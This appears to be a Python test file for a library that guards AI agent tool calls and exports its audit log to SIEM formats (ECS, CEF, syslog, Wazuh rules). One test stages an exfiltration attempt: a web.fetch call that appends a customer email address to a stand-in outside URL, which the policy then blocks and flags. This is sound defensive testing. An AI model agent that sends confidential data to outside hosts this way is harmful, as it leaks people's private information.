import json
import socket
import subprocess
import sys
import tempfile
import threading
import time
import unittest
import xml.etree.ElementTree as ET
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from securegent import AgentRegistry, AuditLog, Blocked, Guard, Policy
from securegent.siem import read_entries, severity, to_cef, to_ecs

POLICY = Policy(
    rules=[{"id": "no-leak", "tool": "web.fetch",
            "when": [{"arg": "url", "op": "tainted", "value": "confidential"}], "effect": "deny",
            "reason": "leak"},
           {"id": "ok", "tool": "*", "effect": "allow", "reason": "fine"}],
    sources=[{"tool": "files.read", "label": "confidential"},
             {"tool": "email.read", "label": "untrusted"}])


class SiemTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.path = Path(self.tmp.name) / "audit.jsonl"
        reg = AgentRegistry(secret=b"x")
        reg.register("bot", owner="priya@acme.com", allowed_scopes=["*"])
        self.reg = reg
        self.guard = Guard(reg, POLICY, AuditLog(self.path))
        self.guard.tool("files.read")(lambda path: "asha@example.com,9876543210")
        self.guard.tool("web.fetch")(lambda url: "ok")
        self.token = reg.issue_token("bot", ["files.read", "web.fetch"], task="t")

    def tearDown(self):
        self.tmp.cleanup()

    def entries(self):
        return AuditLog(self.path).read()

    def test_allowed_event(self):
        self.guard.call(self.token, "files.read", path="customers.csv")
        ecs = to_ecs(self.entries()[-1])
        self.assertEqual(ecs["event"]["outcome"], "success")
        self.assertEqual(ecs["event"]["severity"], 1)
        self.assertEqual(ecs["securegent"]["agent_id"], "bot")
        self.assertEqual(ecs["user"]["name"], "priya@acme.com")
        self.assertIsInstance(ecs["securegent"]["args"], str)
        self.assertRegex(ecs["@timestamp"], r"[+-]\d\d:\d\d$")    # has a UTC offset
        self.assertEqual(len(ecs["event"]["id"]), 32)

    def test_tainted_denial_is_high_severity_with_atlas(self):
        self.guard.call(self.token, "files.read", path="customers.csv")
        with self.assertRaises(Blocked):
            self.guard.call(self.token, "web.fetch", url="https://x.example/?d=asha@example.com")
        e = self.entries()[-1]
        ecs = to_ecs(e)
        self.assertEqual(ecs["event"]["severity"], 8)
        self.assertEqual(ecs["event"]["kind"], "alert")
        self.assertTrue(ecs["securegent"]["tainted"])
        self.assertEqual(ecs["threat"]["technique"]["id"], ["AML.T0057"])
        cef = to_cef(e)
        self.assertTrue(cef.startswith("CEF:0|Securegent|Securegent|"))
        self.assertIn("|policy-deny|", cef)
        self.assertIn("|8|", cef)
        self.assertIn("cs5=AML.T0057", cef)

    def test_scope_and_auth_stages(self):
        with self.assertRaises(Blocked):
            self.guard.check(self.token, "email.read", {})
        self.assertEqual(to_ecs(self.entries()[-1])["securegent"]["stage"], "scope")
        self.reg.disable("bot")
        with self.assertRaises(Blocked):
            self.guard.check(self.token, "files.read", {"path": "a"})
        e = self.entries()[-1]
        self.assertEqual((to_ecs(e)["securegent"]["stage"], severity(e)), ("auth", 7))

    def test_old_entries_without_stage_or_id(self):
        old = {"ts": "2026-11-19T10:00:00", "tool": "pay", "args": {}, "decision": "deny",
               "reason": "approval refused: big"}
        self.assertEqual(to_ecs(old)["securegent"]["stage"], "approval")
        self.assertNotIn("id", to_ecs(old)["event"])

    def test_cef_escaping(self):
        e = {"ts": "2026-11-19T10:00:00", "tool": "a|b", "decision": "deny", "stage": "policy",
             "reason": "x=y\nz\\w", "args": {}}
        cef = to_cef(e)
        self.assertIn("reason=x\\=y\\nz\\\\w", cef)
        self.assertNotIn("\n", cef)

    def test_follow_waits_for_complete_lines_and_handles_truncation(self):
        self.path.write_bytes(b'{"decision":"allow","tool":"a"}\n{"decision":"allow",')
        stop = threading.Event()
        got = []

        def run():
            for e in read_entries(self.path, follow=True, poll=0.05, stop=stop.is_set):
                got.append(e["tool"])
        t = threading.Thread(target=run, daemon=True)
        t.start()
        time.sleep(0.3)
        self.assertEqual(got, ["a"])                     # the half-written line waits
        with self.path.open("ab") as f:
            f.write(b'"tool":"b"}\n')
        time.sleep(0.3)
        self.path.write_bytes(b'{"decision":"deny","tool":"c"}\n')   # rotated / truncated
        time.sleep(0.3)
        stop.set()
        t.join(2)
        self.assertEqual(got, ["a", "b", "c"])

    def test_cli_and_syslog(self):
        self.guard.call(self.token, "files.read", path="x")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(("127.0.0.1", 0))
        sock.settimeout(10)
        port = sock.getsockname()[1]
        out = subprocess.run([sys.executable, "-m", "securegent.siem", "--audit", str(self.path),
                              "--format", "cef", "--syslog", f"127.0.0.1:{port}"],
                             cwd=ROOT, capture_output=True, text=True, timeout=30)
        self.assertEqual(out.returncode, 0, out.stderr)
        self.assertTrue(out.stdout.startswith("CEF:0|"))
        data = sock.recv(65535).decode()
        sock.close()
        self.assertRegex(data, r"^<134>1 \S+ \S+ securegent - - - CEF:0\|")   # local0.info

    def test_wazuh_rules_are_valid_xml(self):
        root = ET.parse(ROOT / "docs" / "siem" / "wazuh-securegent-rules.xml").getroot()
        ids = [r.get("id") for r in root.iter("rule")]
        self.assertEqual(len(ids), len(set(ids)))


if __name__ == "__main__":
    unittest.main()
